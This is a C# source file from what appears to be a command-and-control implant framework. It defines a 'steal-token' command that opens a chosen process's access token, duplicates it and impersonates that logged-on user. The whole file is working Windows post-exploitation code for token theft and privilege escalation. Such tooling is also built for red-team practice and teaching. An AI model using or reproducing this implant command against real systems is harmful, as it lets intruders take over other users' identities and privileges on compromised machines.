using Agent.Models;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Security.Principal;
using System.Text;
using System.Threading.Tasks;
using static Agent.Native.Advapi;

namespace Agent.Commands
{
    public class StealToken : AgentCommand
    {
        public override string Name => "steal-token";

        public override string Execute(AgentTask task)
        {

            if (!int.TryParse(task.Arguments[0], out var pid))
                return "Failed to parse PID";

            // open a handle to process
            var process = Process.GetProcessById(pid);

            var hToken = IntPtr.Zero;
            var hTokenDup = IntPtr.Zero;

            try
            {
                // open a handle to token
                if (!Native.Advapi.OpenProcessToken(process.Handle, Native.Advapi.DesiredAccess.TOKEN_ALL_ACCESS, out hToken))
                    return "Failed to open process token";

                // duplicate token
                var sa = new SECURITY_ATTRIBUTES();
                if (!Native.Advapi.DuplicateTokenEx(hToken, Native.Advapi.TokenAccess.TOKEN_ALL_ACCESS, ref sa,
                    SecurityImpersonationLevel.SECURITY_IMPERSONATION, TokenType.TOKEN_IMPERSONATION, out hTokenDup))
                {
                    return "Failed to duplicate token";
                }

                // impersonate token
                if (Native.Advapi.ImpersonateLoggedOnUser(hTokenDup))
                {
                    var identity = new WindowsIdentity(hTokenDup);
                    return $"Successfully impersonated {identity.Name}";
                }

                return "Failed to impersonate token";

            }
            catch { }
            finally
            {
                // close token handles
                if (hToken != IntPtr.Zero) Native.Kernel32.CloseHandle(hToken);
                if (hTokenDup != IntPtr.Zero) Native.Kernel32.CloseHandle(hTokenDup);

                process.Dispose();
            }

            return "Unknown error";
        }
    }
}
